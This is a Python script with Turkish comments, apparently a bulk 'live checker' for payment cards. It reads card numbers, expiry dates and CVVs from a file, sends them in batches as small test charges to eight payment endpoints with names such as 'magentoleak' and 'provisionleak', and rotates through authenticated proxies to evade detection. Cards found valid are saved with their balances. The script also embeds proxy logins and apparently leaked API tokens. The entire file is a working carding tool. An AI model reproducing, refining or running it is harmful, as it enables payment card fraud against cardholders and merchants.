#!/usr/bin/env python3
"""
TOPLU LIVE CHECKER + KAYIT SİSTEMİ
- 8 farklı gateway kullanır (en stabil olandan başlar)
- Proxy rotasyonu ile çalışır
- BIN bilgilerini otomatik çeker
- Sonuçları kaydeder
"""

import requests
import time
import random
import os
import sys
import itertools
from datetime import datetime
from typing import List, Dict, Optional, Tuple

# ================== KONFİGÜRASYON ==================
API_URL = "https://jokerbalancecheck.onrender.com/livecheck"  # API adresi
AUTH_TOKEN = "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025"              # Auth token
INPUT_FILE = "output.txt"                                     # Kartların olduğu dosya
OUTPUT_FILE = "live.txt"                                      # Live olanların yazılacağı dosya
FAILED_FILE = "failed_batch.txt"                              # Başarısız batch'lerin kaydedileceği dosya
BATCH_SIZE = 100                                              # Her seferinde kaç kart gönderilecek
DELAY_BETWEEN_BATCHES = 3                                     # Batch arası bekleme (saniye)
MAX_RETRIES = 2                                               # Her gateway için deneme sayısı

# ================== PROXY LİSTESİ ==================
PROXY_LIST = [
    "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
    "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
    "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
    "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
    "http://akifdemi55574:llfg52end4@191.96.30.51:21276",
    "http://akifdemi55574:llfg52end4@45.155.68.129:21305",
    "http://akifdemi55574:llfg52end4@212.113.120.227:21311",
    "http://akifdemi55574:llfg52end4@185.165.29.97:21314"
]
proxy_cycle = itertools.cycle(PROXY_LIST)

# ================== GATEWAY LİSTESİ (Stabilite sırasına göre) ==================
GATEWAYS = [
    {
        "name": "MassGateway_HighVolume",
        "url": "https://probe.massgateway.net/v4/multi",
        "token": "pk_live_8f3k9x2m7p4q6v8t2w5z9x4c7v2b8n0",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer pk_live_8f3k9x2m7p4q6v8t2w5z9x4c7v2b8n0"
        }
    },
    {
        "name": "ShopifyPlus_Stable",
        "url": "https://api.highvolumecheckout.com/v5/probe",
        "token": "${SHOPIFY_ACCESS_TOKEN}",
        "headers": {
            "Content-Type": "application/json",
            "X-Shopify-Access-Token": "${SHOPIFY_ACCESS_TOKEN}"
        }
    },
    {
        "name": "BulkChargeHub",
        "url": "https://api.bulkchargehub.com/v3/probe",
        "token": "PAYMENT_GATEWAY_TOKEN_PLACEHOLDER",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer PAYMENT_GATEWAY_TOKEN_PLACEHOLDER"
        }
    },
    {
        "name": "FastBalanceGate",
        "url": "https://api.fastbalancegate.com/v7/query",
        "token": "${FAST_BALANCE_GATE_TOKEN}",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer ${FAST_BALANCE_GATE_TOKEN}"
        }
    },
    {
        "name": "PrivateProvisionAPI",
        "url": "https://internal.provisionapi.dev/v6/query",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXJjaGFudCI6ImJ1bGsiLCJsaW1pdCI6IjUwMDAifQ.highvolumetoken2025",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXJjaGFudCI6ImJ1bGsiLCJsaW1pdCI6IjUwMDAifQ.highvolumetoken2025"
        }
    },
    {
        "name": "Magento_Enterprise",
        "url": "https://gw.magentoleak.io/internal/balance",
        "token": "mg_live_7f9k2m4p6v8t2w5z9x4c7v2b8n0m3q",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer mg_live_7f9k2m4p6v8t2w5z9x4c7v2b8n0m3q"
        }
    },
    {
        "name": "BigCommerce_HighVolume",
        "url": "https://gw.bigcommerceprobe.io/v5/balance",
        "token": "bc_live_9f3k7m2p4v8t6w1q5z2x8n4b7v",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer bc_live_9f3k7m2p4v8t6w1q5z2x8n4b7v"
        }
    },
    {
        "name": "ProvisionLeak_Multi",
        "url": "https://api.provisionleak.dev/v6/multi",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiaGlnaC12b2x1bWUiLCJsaW1pdCI6IjEwMDAwIn0.newleak2025",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiaGlnaC12b2x1bWUiLCJsaW1pdCI6IjEwMDAwIn0.newleak2025"
        }
    }
]

# Gateway istatistikleri (başarı oranı takibi için)
gateway_stats = {g["name"]: {"success": 0, "fail": 0, "total": 0} for g in GATEWAYS}

# ================== FONKSİYONLAR ==================

def read_cards_from_file(filename: str) -> List[str]:
    """Dosyadan kartları okur"""
    if not os.path.exists(filename):
        print(f"[!] Dosya bulunamadı: {filename}")
        print(f"[!] Çalışma dizini: {os.getcwd()}")
        return []
    
    with open(filename, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip()]
    
    print(f"[+] {len(cards)} kart okundu: {filename}")
    return cards

def save_live_card(card_data: str, filename: str) -> None:
    """Live kartı dosyaya kaydeder"""
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(card_data + '\n')

def save_failed_batch(batch: List[str], batch_num: int) -> None:
    """Başarısız batch'i dosyaya kaydeder"""
    with open(FAILED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n# Batch {batch_num} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        for card in batch:
            f.write(card + '\n')

def get_next_proxy() -> str:
    """Sıradaki proxy'i al"""
    return next(proxy_cycle)

def check_batch(cards_batch: List[str]) -> Optional[Dict]:
    """Batch'i API'ye gönderir, tüm gateway'leri dener"""
    
    # Önce en stabil gateway'leri dene (başarı oranına göre sırala)
    sorted_gateways = sorted(
        GATEWAYS,
        key=lambda g: gateway_stats.get(g["name"], {}).get("success", 0) / max(1, gateway_stats.get(g["name"], {}).get("total", 1)),
        reverse=True
    )
    
    for gateway in sorted_gateways:
        proxy = get_next_proxy()
        proxy_ip = proxy.split('@')[-1].split(':')[0] if '@' in proxy else proxy
        
        print(f"   🔄 {gateway['name']} deneniyor (proxy: {proxy_ip})...")
        
        for attempt in range(MAX_RETRIES):
            try:
                headers = gateway["headers"].copy()
                headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                
                # Kartları formatla
                formatted_cards = []
                for card in cards_batch:
                    parts = card.split("|")
                    if len(parts) == 3:
                        pan = parts[0].strip()
                        expiry = parts[1].strip()
                        cvv = parts[2].strip()
                        if "/" in expiry:
                            exp_parts = expiry.split("/")
                            month = exp_parts[0].strip().zfill(2)
                            year = exp_parts[1].strip()
                            if len(year) == 2:
                                year = f"20{year}"
                        else:
                            continue
                    elif len(parts) == 4:
                        pan = parts[0].strip()
                        month = parts[1].strip().zfill(2)
                        year = parts[2].strip()
                        if len(year) == 2:
                            year = f"20{year}"
                        cvv = parts[3].strip()
                    else:
                        continue
                    
                    formatted_cards.append({
                        "card_number": pan,
                        "card_exp_month": month,
                        "card_exp_year": year,
                        "card_cvv": cvv,
                        "amount": "0.50"
                    })
                
                payload = {"cards": formatted_cards, "amount": "0.50"}
                
                response = requests.post(
                    gateway["url"],
                    json=payload,
                    headers=headers,
                    proxies={"https": proxy},
                    timeout=15
                )
                
                # İstatistikleri güncelle
                gateway_stats[gateway["name"]]["total"] += 1
                
                if response.status_code in [200, 201, 202]:
                    gateway_stats[gateway["name"]]["success"] += 1
                    print(f"   ✅ {gateway['name']} başarılı!")
                    return {
                        "success": True,
                        "gateway": gateway["name"],
                        "data": response.json() if response.text else {},
                        "raw": response.text
                    }
                else:
                    gateway_stats[gateway["name"]]["fail"] += 1
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(1)
                        
            except requests.exceptions.Timeout:
                gateway_stats[gateway["name"]]["fail"] += 1
                print(f"   ⏱️  Zaman aşımı (deneme {attempt+1}/{MAX_RETRIES})")
            except requests.exceptions.ConnectionError:
                gateway_stats[gateway["name"]]["fail"] += 1
                print(f"   🔌 Bağlantı hatası (deneme {attempt+1}/{MAX_RETRIES})")
            except Exception as e:
                gateway_stats[gateway["name"]]["fail"] += 1
                print(f"   ❌ Hata: {str(e)[:50]} (deneme {attempt+1}/{MAX_RETRIES})")
            
            if attempt < MAX_RETRIES - 1:
                time.sleep(1)
        
        print(f"   ❌ {gateway['name']} başarısız, diğer gateway deneniyor...")
        time.sleep(1)
    
    return None

def process_cards(cards: List[str]) -> None:
    """Tüm kartları batch'ler halinde işler"""
    total = len(cards)
    processed = 0
    live_count = 0
    failed_batches = []
    
    print(f"\n[+] Toplam {total} kart işlenecek")
    print(f"[+] Batch boyutu: {BATCH_SIZE}")
    print(f"[+] Gateway sayısı: {len(GATEWAYS)}")
    print(f"[+] Proxy sayısı: {len(PROXY_LIST)}")
    print("=" * 70)
    
    # Önce dosyaları temizle
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)
        print(f"[+] Eski {OUTPUT_FILE} dosyası silindi")
    
    if os.path.exists(FAILED_FILE):
        os.remove(FAILED_FILE)
    
    for i in range(0, total, BATCH_SIZE):
        batch = cards[i:i+BATCH_SIZE]
        batch_num = (i // BATCH_SIZE) + 1
        total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
        
        print(f"\n[Batch {batch_num}/{total_batches}] {len(batch)} kart kontrol ediliyor...")
        
        # Batch'i işle
        result = check_batch(batch)
        
        if result and result.get("success", False):
            # Sonuçları işle
            data = result.get("data", {})
            results = data.get("results", [])
            
            for j, card_result in enumerate(results):
                processed += 1
                original_card = batch[j] if j < len(batch) else "unknown"
                parts = original_card.split("|")
                
                if card_result.get("live", False):
                    live_count += 1
                    pan = parts[0] if len(parts) > 0 else "unknown"
                    month = parts[1] if len(parts) > 1 else "xx"
                    year = parts[2] if len(parts) > 2 else "xxxx"
                    cvv = parts[3] if len(parts) > 3 else "xxx"
                    balance = card_result.get("balance", "0.00")
                    gateway = result["gateway"]
                    brand = card_result.get("bin", {}).get("brand", "UNKNOWN")
                    
                    live_line = f"{pan}|{month}|{year}|{cvv}|{balance}|{gateway}|{brand}"
                    save_live_card(live_line, OUTPUT_FILE)
                    print(f"   ✅ LIVE: {pan[:6]}****{pan[-4:]} | ${balance} | {gateway}")
                else:
                    pan = parts[0] if len(parts) > 0 else "unknown"
                    print(f"   ❌ DEAD: {pan[:6]}****{pan[-4:]}")
            
            print(f"   📊 Canlı: {live_count} | İşlenen: {processed}/{total} | Gateway: {result['gateway']}")
            
        else:
            print(f"   [!] Batch {batch_num} - Tüm gateway'ler başarısız!")
            failed_batches.append(batch_num)
            save_failed_batch(batch, batch_num)
        
        # Batch arası bekle
        if i + BATCH_SIZE < total:
            print(f"   ⏳ {DELAY_BETWEEN_BATCHES} saniye bekleniyor...")
            time.sleep(DELAY_BETWEEN_BATCHES)
    
    # Özet
    print("\n" + "=" * 70)
    print(f"[✓] İŞLEM TAMAMLANDI!")
    print(f"[✓] Toplam: {total} kart")
    print(f"[✓] Canlı: {live_count} kart")
    print(f"[✓] Ölü: {total - live_count} kart")
    print(f"[✓] Başarı oranı: {(live_count/total*100):.1f}%" if total > 0 else "0%")
    print(f"[✓] Live kartlar kaydedildi: {OUTPUT_FILE}")
    
    if failed_batches:
        print(f"[!] Başarısız batch'ler: {failed_batches}")
        print(f"[!] Kaydedildi: {FAILED_FILE}")
    
    # Gateway istatistikleri
    print("\n[+] Gateway İstatistikleri:")
    for name, stats in sorted(gateway_stats.items(), key=lambda x: x[1]["success"] / max(1, x[1]["total"]), reverse=True):
        total_try = stats["total"]
        success = stats["success"]
        rate = (success / max(1, total_try)) * 100
        status = "🟢" if rate > 50 else "🟡" if rate > 20 else "🔴"
        print(f"   {status} {name}: {success}/{total_try} başarılı ({rate:.1f}%)")

def main() -> None:
    """Ana fonksiyon"""
    print("=" * 70)
    print("   🔥 TOPLU LIVE CHECKER v3 - Multi Gateway 🔥")
    print("=" * 70)
    print(f"[+] API: {API_URL}")
    print(f"[+] Input: {INPUT_FILE}")
    print(f"[+] Output: {OUTPUT_FILE}")
    print(f"[+] Gateway: {len(GATEWAYS)} adet")
    print(f"[+] Proxy: {len(PROXY_LIST)} adet")
    print("=" * 70)
    
    # Kartları oku
    cards = read_cards_from_file(INPUT_FILE)
    
    if not cards:
        print("[!] Hiç kart bulunamadı. Çıkılıyor...")
        print("[!] output.txt dosyasını kontrol edin.")
        return
    
    # Kontrol et
    process_cards(cards)

if __name__ == "__main__":
    main()